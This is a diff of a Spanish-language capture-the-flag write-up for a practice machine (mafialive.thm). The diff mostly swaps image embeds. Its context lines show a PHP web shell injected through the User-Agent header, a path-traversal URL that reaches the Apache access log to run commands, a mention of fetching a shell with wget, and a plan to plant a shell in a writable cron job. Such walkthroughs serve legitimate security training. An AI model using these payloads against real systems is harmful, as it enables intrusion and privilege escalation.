@@ -38,14 +38,13 @@ Modificamos el php mediante el parámetro user-Agent:
 ```php
 <?php system($_GET['cmd']);?>
 ```
-
+![[Pasted image 20231115002021.png]]
 
 Podemos ejecutar comandos mediante el parámetro ``&cmd=``
 ```bash
 http://mafialive.thm/test.php?view=/var/www/html/development_testing/..//..//..//..//..//var/log/apache2/access.log&cmd=id
 ```
-
-![](user.png)
+![[Pasted image 20231115002056.png]]
 
 Cargamos una shell en php mediante wget. 
 ```
@@ -54,7 +53,6 @@ http://mafialive.thm/test.php?view=/var/www/html/development_testing/..//..//../
 
 ## Shell www-data
 
-![[Pasted image 20231020001833.png]]
 
 ## movimiento lateral
 hay una tarea cron que se ejecuta cada cierto tiempo, tenemos permisos de escritura en este archivo, así que vamos a meterle una shell, para pasarnos al usuario archangel.
